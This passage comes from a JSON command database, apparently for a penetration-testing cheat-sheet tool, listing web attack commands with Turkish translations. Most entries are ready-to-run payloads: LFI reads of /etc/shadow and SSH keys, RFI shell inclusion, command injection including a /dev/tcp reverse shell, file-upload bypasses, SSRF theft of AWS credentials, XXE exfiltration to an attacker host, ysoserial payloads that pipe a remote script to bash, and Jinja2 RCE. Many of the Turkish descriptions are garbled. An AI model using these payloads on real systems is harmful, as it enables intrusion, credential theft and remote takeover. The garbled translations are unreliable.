            "cmd": "gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c 'session=<COOKIE>'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Directory kaba kuvvet saldırısı sessicookie ile üzerinde"
          },
          {
            "title": "Feroxbuster Recursive",
            "desc": "Recursive directory brute force",
            "cmd": "feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -o ferox.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Özyinelemeli directory kaba kuvvet saldırısı"
          },
          {
            "title": "Feroxbuster with Depth",
            "desc": "Control recursion depth",
            "cmd": "feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3 -x php,html,txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Control recursidepth üzerinde"
          },
          {
            "title": "FFUF Directory Discovery",
            "desc": "Fast directory fuzzing with ffuf",
            "cmd": "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ffuf.json",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Hızlı directory fuzzing/bulanıklaştırma ffuf ile"
          },
          {
            "title": "FFUF with Dirb Common",
            "desc": "Quick directory scan with dirb common wordlist",
            "cmd": "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Hızlı directory tarama dirb commkelime listesi ile üzerinde"
          },
          {
            "title": "FFUF with Status Code Filter",
            "desc": "Directory fuzzing filtering out 403/404 responses",
            "cmd": "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 403,404",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Directory fuzzing/bulanıklaştırma filtering out 403/404 responses"
          },
          {
            "title": "FFUF VHost Discovery",
            "desc": "Virtual host discovery with ffuf",
            "cmd": "ffuf -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <FILTER_SIZE>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Virtual aktif host keşfi ffuf ile"
          },
          {
            "title": "FFUF Extension Fuzzing",
            "desc": "Fuzz for files with specific extensions",
            "cmd": "ffuf -u http://<TARGET_IP>/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Fuzz for files belirli extensions ile"
          },
          {
            "title": "Dirsearch Standard",
            "desc": "Web path scanner with smart wordlist",
            "cmd": "dirsearch -u http://<TARGET_IP> -e php,html,txt,asp,aspx,jsp",
            "tags": [
              "tool"
            ],
            "desc_tr": "Web path tarayıcı smart kelime listesi ile"
          },
          {
            "title": "Dirb Default Scan",
            "desc": "Web content brute force with dirb",
            "cmd": "dirb http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Web content kaba kuvvet saldırısı dirb ile"
          },
          {
            "title": "Wfuzz Directory Discovery",
            "desc": "Directory fuzzing with wfuzz",
            "cmd": "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 http://<TARGET_IP>/FUZZ",
            "tags": [
              "tool"
            ],
            "desc_tr": "Directory fuzzing/bulanıklaştırma wfuzz ile"
          }
        ],
        "name_tr": "Path & Content Discovery"
      },
      {
        "name": "Parameter Discovery & Fuzzing",
        "commands": [
          {
            "title": "FFUF GET Parameter Fuzzing",
            "desc": "Discover hidden GET parameters",
            "cmd": "ffuf -u 'http://<TARGET_IP>/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <FILTER_SIZE>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Keşfet: gizli GET parameters"
          },
          {
            "title": "FFUF POST Parameter Fuzzing",
            "desc": "Discover hidden POST parameters",
            "cmd": "ffuf -u http://<TARGET_IP>/page -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <FILTER_SIZE>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Keşfet: gizli POST parameters"
          },
          {
            "title": "FFUF Value Fuzzing",
            "desc": "Fuzz parameter values",
            "cmd": "ffuf -u 'http://<TARGET_IP>/page?id=FUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt -fs <FILTER_SIZE>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Fuzz parameter values"
          },
          {
            "title": "Wfuzz POST Parameter Fuzz",
            "desc": "Fuzz POST data with wfuzz",
            "cmd": "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hc 404 http://<TARGET_IP>/page",
            "tags": [
              "tool"
            ],
            "desc_tr": "Fuzz POST data wfuzz ile"
          },
          {
            "title": "FFUF Recursive Fuzzing",
            "desc": "Recursive directory fuzzing with filters",
            "cmd": "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -recursion-depth 2 -e .php,.html,.txt -fs <FILTER_SIZE>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Özyinelemeli directory fuzzing/bulanıklaştırma filters ile"
          },
          {
            "title": "FFUF with Cookie Auth",
            "desc": "Fuzz with authenticated session",
            "cmd": "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 'session=<COOKIE>' -fs <FILTER_SIZE>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Fuzz authenticated sessiile üzerinde"
          }
        ],
        "name_tr": "Parameter Discovery & Fuzzing"
      },
      {
        "name": "Local File Inclusion",
        "commands": [
          {
            "title": "LFI Basic Traversal",
            "desc": "Basic directory traversal to read /etc/passwd",
            "cmd": "curl 'http://<TARGET_IP>/page?file=../../../../etc/passwd'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Basic directory traversal read /etc/passwd'e"
          },
          {
            "title": "LFI Null Byte Bypass",
            "desc": "Null byte to bypass extension appending (PHP <5.3)",
            "cmd": "curl 'http://<TARGET_IP>/page?file=../../../../etc/passwd%00'",
            "tags": [
              "essential"
            ],
            "note": "Works on PHP < 5.3.4",
            "desc_tr": "Null byte bypass extensiappending (PHP <5.3) üzerinde'e"
          },
          {
            "title": "LFI Double Encoding",
            "desc": "Double URL-encode traversal characters",
            "cmd": "curl 'http://<TARGET_IP>/page?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Double URL-kodlama traversal characters"
          },
          {
            "title": "LFI PHP Base64 Wrapper",
            "desc": "Read PHP source code via base64 wrapper",
            "cmd": "curl 'http://<TARGET_IP>/page?file=php://filter/convert.base64-encode/resource=index.php'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: PHP source code base64 wrapper üzerinden"
          },
          {
            "title": "LFI PHP Input Wrapper",
            "desc": "Execute PHP code via input wrapper",
            "cmd": "curl -X POST 'http://<TARGET_IP>/page?file=php://input' -d '<?php system(\"id\"); ?>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: PHP code input wrapper üzerinden"
          },
          {
            "title": "LFI Data Wrapper",
            "desc": "Execute PHP via data:// wrapper",
            "cmd": "curl 'http://<TARGET_IP>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çalıştır: PHP data:// wrapper üzerinden"
          },
          {
            "title": "LFI Expect Wrapper",
            "desc": "Execute commands via expect wrapper",
            "cmd": "curl 'http://<TARGET_IP>/page?file=expect://id'",
            "tags": [
              "advanced"
            ],
            "note": "Requires expect module enabled",
            "desc_tr": "Çalıştır: commands expect wrapper üzerinden"
          },
          {
            "title": "LFI Log Poisoning (Apache)",
            "desc": "Poison Apache access log then include it",
            "cmds": [
              "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://<TARGET_IP>/",
              "curl 'http://<TARGET_IP>/page?file=../../../../var/log/apache2/access.log&cmd=id'"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Log path varies: /var/log/apache2/access.log, /var/log/httpd/access_log",
            "desc_tr": "PoisApache access log then include it üzerinde"
          },
          {
            "title": "LFI Log Poisoning (SSH)",
            "desc": "Poison auth.log via SSH then include it",
            "cmds": [
              "ssh '<?php system($_GET[\"cmd\"]); ?>'@<TARGET_IP>",
              "curl 'http://<TARGET_IP>/page?file=../../../../var/log/auth.log&cmd=id'"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Poisauth.log SSH then include it üzerinden üzerinde"
          },
          {
            "title": "LFI /proc/self/environ",
            "desc": "Include process environment variables",
            "cmd": "curl 'http://<TARGET_IP>/page?file=../../../../proc/self/environ'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Include process ortam değişkenleri"
          },
          {
            "title": "LFI Common Linux Files",
            "desc": "Important files to check via LFI on Linux",
            "cmds": [
              "curl 'http://<TARGET_IP>/page?file=../../../../etc/passwd'",
              "curl 'http://<TARGET_IP>/page?file=../../../../etc/shadow'",
              "curl 'http://<TARGET_IP>/page?file=../../../../etc/hosts'",
              "curl 'http://<TARGET_IP>/page?file=../../../../home/<USER>/.ssh/id_rsa'",
              "curl 'http://<TARGET_IP>/page?file=../../../../etc/crontab'"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Important files check LFI Linux üzerinden üzerinde'e"
          },
          {
            "title": "LFI Common Windows Files",
            "desc": "Important files to check via LFI on Windows",
            "cmds": [
              "curl 'http://<TARGET_IP>/page?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'",
              "curl 'http://<TARGET_IP>/page?file=..\\..\\..\\..\\windows\\win.ini'",
              "curl 'http://<TARGET_IP>/page?file=..\\..\\..\\..\\windows\\system.ini'"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Important files check LFI Windows üzerinden üzerinde'e"
          }
        ],
        "name_tr": "Local File Inclusion"
      },
      {
        "name": "Remote File Inclusion",
        "commands": [
          {
            "title": "RFI Basic Inclusion",
            "desc": "Include a remote PHP shell",
            "cmd": "curl 'http://<TARGET_IP>/page?file=http://<ATTACKER_IP>/shell.php'",
            "tags": [
              "essential"
            ],
            "note": "Requires allow_url_include=On in PHP",
            "desc_tr": "Include a uzak PHP shell"
          },
          {
            "title": "RFI with Null Byte",
            "desc": "RFI with null byte to bypass extension appending",
            "cmd": "curl 'http://<TARGET_IP>/page?file=http://<ATTACKER_IP>/shell.txt%00'",
            "tags": [
              "essential"
            ],
            "desc_tr": "RFI null byte bypass extensiappending ile üzerinde'e"
          },
          {
            "title": "RFI SMB Share (Windows)",
            "desc": "Include file from attacker SMB share on Windows target",
            "cmd": "curl 'http://<TARGET_IP>/page?file=\\\\<ATTACKER_IP>\\share\\shell.php'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Include file attacker SMB share Windows target üzerinden üzerinde"
          },
          {
            "title": "Host RFI Payload",
            "desc": "Start a web server to host RFI payloads",
            "cmd": "python3 -m http.server 80",
            "tags": [
              "essential"
            ],
            "desc_tr": "Başlat: a web server host RFI payloads'e"
          }
        ],
        "name_tr": "Remote File Inclusion"
      },
      {
        "name": "OS Command Injection",
        "commands": [
          {
            "title": "Command Injection Semicolon",
            "desc": "Inject command using semicolon separator",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;id'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: command semicolseparator kullanarak üzerinde"
          },
          {
            "title": "Command Injection Pipe",
            "desc": "Inject command using pipe operator",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1|id'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: command pipe operator kullanarak"
          },
          {
            "title": "Command Injection OR",
            "desc": "Inject using logical OR",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=||id'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: logical OR kullanarak"
          },
          {
            "title": "Command Injection AND",
            "desc": "Inject using logical AND",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1&&id'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: logical AND kullanarak"
          },
          {
            "title": "Command Injection Substitution",
            "desc": "Inject via command substitution",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=$(id)'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: command substitutiüzerinden üzerinde"
          },
          {
            "title": "Command Injection Backticks",
            "desc": "Inject via backtick substitution",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=`id`'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: backtick substitutiüzerinden üzerinde"
          },
          {
            "title": "Command Injection Newline",
            "desc": "Inject command with URL-encoded newline",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1%0aid'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Enjekte et: command URL-encoded newline ile"
          },
          {
            "title": "Blind Command Injection (Time)",
            "desc": "Detect blind injection with sleep delay",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;sleep+5'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Algıla: blind enjeksiysleep delay ile üzerinde"
          },
          {
            "title": "Blind Command Injection (OOB)",
            "desc": "Detect blind injection via out-of-band DNS/HTTP",
            "cmds": [
              "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;curl+http://<ATTACKER_IP>/$(whoami)'",
              "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;nslookup+$(whoami).<ATTACKER_DOMAIN>'"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Algıla: blind enjeksiyout-of-band DNS/HTTP üzerinden üzerinde"
          },
          {
            "title": "Command Injection Rev Shell",
            "desc": "Inject a reverse shell command",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;bash+-c+\"bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/<PORT>+0>%261\"'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Enjekte et: a ters bağlantı kabuğu command"
          }
        ],
        "name_tr": "OS Command Injection"
      },
      {
        "name": "Unrestricted File Upload",
        "commands": [
          {
            "title": "Upload PHP Shell (Direct)",
            "desc": "Upload a basic PHP web shell",
            "cmd": "curl -F 'file=@shell.php' http://<TARGET_IP>/upload",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yükle: a basic PHP web kabuğu"
          },
          {
            "title": "Upload Double Extension Bypass",
            "desc": "Bypass extension filter with double extension",
            "cmd": "curl -F 'file=@shell.php.jpg' http://<TARGET_IP>/upload",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: extensifilter double extension ile üzerinde"
          },
          {
            "title": "Upload Content-Type Bypass",
            "desc": "Bypass content-type validation",
            "cmd": "curl -F 'file=@shell.php;type=image/jpeg' http://<TARGET_IP>/upload",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: content-type validation"
          },
          {
            "title": "Upload .htaccess Override",
            "desc": "Upload .htaccess to make .jpg execute as PHP",
            "cmds": [
              "echo 'AddType application/x-httpd-php .jpg' > .htaccess",
              "curl -F 'file=@.htaccess' http://<TARGET_IP>/upload",
              "curl -F 'file=@shell.jpg' http://<TARGET_IP>/upload"
            ],
            "tags": [
              "advanced"
            ],
            "note": "shell.jpg contains PHP code",
            "desc_tr": "Yükle: .htaccess make .jpg execute as PHP'e"
          },
          {
            "title": "Upload Case Variation",
            "desc": "Bypass with case-altered extension",
            "cmd": "curl -F 'file=@shell.pHp' http://<TARGET_IP>/upload",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: case-altered extensiile üzerinde"
          },
          {
            "title": "Upload Alternate PHP Extensions",
            "desc": "Try alternative PHP extensions",
            "cmds": [
              "curl -F 'file=@shell.php5' http://<TARGET_IP>/upload",
              "curl -F 'file=@shell.phtml' http://<TARGET_IP>/upload",
              "curl -F 'file=@shell.phar' http://<TARGET_IP>/upload",
              "curl -F 'file=@shell.phps' http://<TARGET_IP>/upload"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Try alternative PHP extensions"
          },
          {
            "title": "Upload Magic Bytes Bypass",
            "desc": "Prepend magic bytes to bypass file type check",
            "cmd": "printf '\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a<?php system($_GET[\"cmd\"]); ?>' > shell.php.png",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Prepend magic bytes bypass file type check'e"
          },
          {
            "title": "Upload Null Byte (Legacy)",
            "desc": "Null byte in filename to bypass filters",
            "cmd": "curl -F 'file=@shell.php%00.jpg' http://<TARGET_IP>/upload",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Null byte filename bypass filters'e içinde"
          }
        ],
        "name_tr": "Unrestricted File Upload"
      },
      {
        "name": "Server-Side Request Forgery",
        "commands": [
          {
            "title": "SSRF Localhost",
            "desc": "Access internal services via localhost",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://127.0.0.1/'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Access internal services localhost üzerinden"
          },
          {
            "title": "SSRF Localhost Bypass (Decimal)",
            "desc": "Bypass filters using decimal IP",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://2130706433/'",
            "tags": [
              "advanced"
            ],
            "note": "2130706433 = 127.0.0.1 in decimal",
            "desc_tr": "Atla: filters decimal IP kullanarak"
          },
          {
            "title": "SSRF Localhost Bypass (Hex)",
            "desc": "Bypass filters using hex IP",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://0x7f000001/'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Atla: filters hex IP kullanarak"
          },
          {
            "title": "SSRF Localhost Bypass (Short)",
            "desc": "Bypass using shortened localhost",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://0/'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Atla: shortened localhost kullanarak"
          },
          {
            "title": "SSRF IPv6 Localhost",
            "desc": "Bypass using IPv6 localhost",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://[::1]/'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Atla: IPv6 localhost kullanarak"
          },
          {
            "title": "SSRF AWS Metadata",
            "desc": "Access AWS EC2 metadata endpoint",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://169.254.169.254/latest/meta-data/'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Access AWS EC2 metadata endpoint"
          },
          {
            "title": "SSRF AWS Credentials",
            "desc": "Steal AWS IAM role credentials",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çal: AWS IAM role kimlik bilgileri"
          },
          {
            "title": "SSRF GCP Metadata",
            "desc": "Access Google Cloud metadata endpoint",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://metadata.google.internal/computeMetadata/v1/'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Access Google Cloud metadata endpoint"
          },
          {
            "title": "SSRF Internal Port Scan",
            "desc": "Scan internal ports via SSRF",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://127.0.0.1:<PORT>/'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tara: ma internal ports SSRF üzerinden"
          },
          {
            "title": "SSRF File Protocol",
            "desc": "Read local files via file:// protocol",
            "cmd": "curl 'http://<TARGET_IP>/page?url=file:///etc/passwd'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: yerel files file:// protocol üzerinden"
          }
        ],
        "name_tr": "Server-Side Request Forgery"
      },
      {
        "name": "XML External Entity Injection",
        "commands": [
          {
            "title": "XXE File Read (Linux)",
            "desc": "Read local file via XXE",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' http://<TARGET_IP>/api",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: yerel file XXE üzerinden"
          },
          {
            "title": "XXE File Read (Windows)",
            "desc": "Read local file on Windows target",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>' http://<TARGET_IP>/api",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oku: yerel file Windows target üzerinde"
          },
          {
            "title": "XXE SSRF",
            "desc": "Server-Side Request Forgery via XXE",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><root>&xxe;</root>' http://<TARGET_IP>/api",
            "tags": [
              "essential"
            ],
            "desc_tr": "Server-Side Request Forgery XXE üzerinden"
          },
          {
            "title": "XXE PHP Base64 Wrapper",
            "desc": "Read PHP source via XXE with base64 encoding",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><root>&xxe;</root>' http://<TARGET_IP>/api",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oku: PHP source XXE base64 kodlama üzerinden ile"
          },
          {
            "title": "XXE OOB Exfiltration",
            "desc": "Out-of-band data exfiltration via XXE",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://<ATTACKER_IP>/xxe.dtd\">%xxe;]><root>test</root>' http://<TARGET_IP>/api",
            "tags": [
              "advanced"
            ],
            "note": "xxe.dtd: <!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://<ATTACKER_IP>/?data=%file;\">'>%eval;%exfil;",
            "desc_tr": "Out-of-band veri sızdırma XXE üzerinden"
          },
          {
            "title": "XXE Billion Laughs (DoS)",
            "desc": "XML bomb for denial of service testing",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><root>&lol2;</root>' http://<TARGET_IP>/api",
            "tags": [
              "advanced"
            ],
            "note": "Use with caution - can crash services",
            "desc_tr": "XML bomb for denial of service testing"
          },
          {
            "title": "Blind XXE with OOB DTD",
            "desc": "Exfiltrate data via out-of-band external DTD",
            "cmds": [
              "# Host this as xxe.dtd on attacker:",
              "# <!ENTITY % file SYSTEM 'file:///etc/hostname'>",
              "# <!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://<ATTACKER_IP>/?d=%file;\">'>",
              "# %eval; %exfil;",
              "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://<ATTACKER_IP>/xxe.dtd\">%xxe;]><root>test</root>' http://<TARGET_IP>/api"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Exfiltrate data out-of-band external DTD üzerinden"
          },
          {
            "title": "Blind XXE Error-Based",
            "desc": "Exfiltrate data through XML parsing errors",
            "cmd": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM \\\"file:///nonexistent/%file;\\\">\">%eval;%error;]><root>test</root>' http://<TARGET_IP>/api",
            "tags": [
              "advanced"
            ],
            "note": "Data appears in error message",
            "desc_tr": "Exfiltrate data XML parsing errors üzerinden"
          },
          {
            "title": "XXE via SVG Upload",
            "desc": "XXE through SVG file upload",
            "cmd": "echo '<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>' > xxe.svg",
            "tags": [
              "advanced"
            ],
            "note": "Upload SVG to endpoints that process XML-based images",
            "desc_tr": "XXE SVG dosya yükleme üzerinden"
          },
          {
            "title": "XXE via DOCX/XLSX",
            "desc": "Inject XXE into Office Open XML files",
            "cmds": [
              "unzip document.docx -d xxe_doc",
              "# Edit xxe_doc/[Content_Types].xml or word/document.xml to add DOCTYPE with ENTITY",
              "cd xxe_doc && zip -r ../evil.docx ."
            ],
            "tags": [
              "advanced"
            ],
            "note": "DOCX/XLSX are ZIP archives containing XML files",
            "desc_tr": "Enjekte et: XXE inOffice Open XML files'e"
          },
          {
            "title": "XXE via SOAP Request",
            "desc": "XXE injection in SOAP web service",
            "cmd": "curl -X POST -H 'Content-Type: text/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>' http://<TARGET_IP>/ws",
            "tags": [
              "advanced"
            ],
            "desc_tr": "XXE enjeksiySOAP web service üzerinde içinde"
          },
          {
            "title": "XInclude Attack",
            "desc": "XXE alternative when you cannot control DOCTYPE",
            "cmd": "curl -X POST -d '<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>' http://<TARGET_IP>/api",
            "tags": [
              "advanced"
            ],
            "note": "Works when input is embedded into server-side XML",
            "desc_tr": "XXE alternative when you cannot control DOCTYPE"
          }
        ],
        "name_tr": "XML External Entity Injection"
      },
      {
        "name": "Insecure Deserialization",
        "commands": [
          {
            "title": "Ysoserial Java Payload (CommonsCollections1)",
            "desc": "Generate Java deserialization payload",
            "cmd": "java -jar ysoserial.jar CommonsCollections1 'ping -c 1 <ATTACKER_IP>' | base64 -w 0",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: Java deserializatipayload üzerinde"
          },
          {
            "title": "Ysoserial Java Payload (CommonsCollections5)",
            "desc": "Generate CC5 gadget chain payload",
            "cmd": "java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,<BASE64_REVSHELL>}|{base64,-d}|bash' | base64 -w 0",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: CC5 gadget chapayload içinde"
          },
          {
            "title": "Ysoserial Java Payload (CommonsCollections7)",
            "desc": "Generate CC7 gadget chain payload",
            "cmd": "java -jar ysoserial.jar CommonsCollections7 'curl http://<ATTACKER_IP>/shell.sh|bash' | base64 -w 0",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: CC7 gadget chapayload içinde"
          },
          {
            "title": "PHP Deserialization Payload",
            "desc": "Craft PHP serialized object for injection",
            "cmd": "php -r 'echo serialize(new stdClass());'",
            "tags": [
              "advanced"
            ],
            "note": "Customize object with magic methods __wakeup() or __destruct() based on target class",
            "desc_tr": "Craft PHP serialized object for enjeksiyon"
          },
          {
            "title": "Python Pickle RCE",
            "desc": "Generate malicious Python pickle payload",
            "cmd": "python3 -c \"import pickle,os,base64; class P(object):\\n def __reduce__(self):\\n  return (os.system,('id',))\\nprint(base64.b64encode(pickle.dumps(P())).decode())\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oluştur: malicious Pythpickle payload üzerinde"
          },
          {
            "title": ".NET Ysoserial Payload",
            "desc": "Generate .NET deserialization payload",
            "cmd": "ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c 'ping <ATTACKER_IP>' -o base64",
            "tags": [
              "tool"
            ],
            "note": "Windows tool for .NET targets",
            "desc_tr": "Oluştur: .NET deserializatipayload üzerinde"
          }
        ],
        "name_tr": "Insecure Deserialization"
      },
      {
        "name": "Template Injection (SSTI)",
        "commands": [
          {
            "title": "SSTI Detection",
            "desc": "Test for template injection with arithmetic",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{7*7}}'",
            "tags": [
              "essential"
            ],
            "note": "If output shows 49, SSTI is confirmed",
            "desc_tr": "Test et: for template enjeksiyarithmetic ile üzerinde"
          },
          {
            "title": "SSTI Jinja2 Detection",
            "desc": "Confirm Jinja2 template engine",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{7*\"7\"}}'",
            "tags": [
              "essential"
            ],
            "note": "Jinja2 returns 7777777, Twig returns 49",
            "desc_tr": "Confirm Jinja2 template engine"
          },
          {
            "title": "SSTI Jinja2 Config Dump",
            "desc": "Dump Flask/Jinja2 configuration",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{config}}'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: Flask/Jinja2 configuration"
          },
          {
            "title": "SSTI Jinja2 RCE (Python3)",
            "desc": "Remote code execution via Jinja2",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Uzaktan kod çalıştırma Jinja2 üzerinden"
          },
          {
            "title": "SSTI Jinja2 RCE (MRO Chain)",
            "desc": "RCE via MRO class traversal",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{''.__class__.__mro__[1].__subclasses__()[<INDEX>]('id',shell=True,stdout=-1).communicate()}}\"",
            "tags": [
              "advanced"
            ],
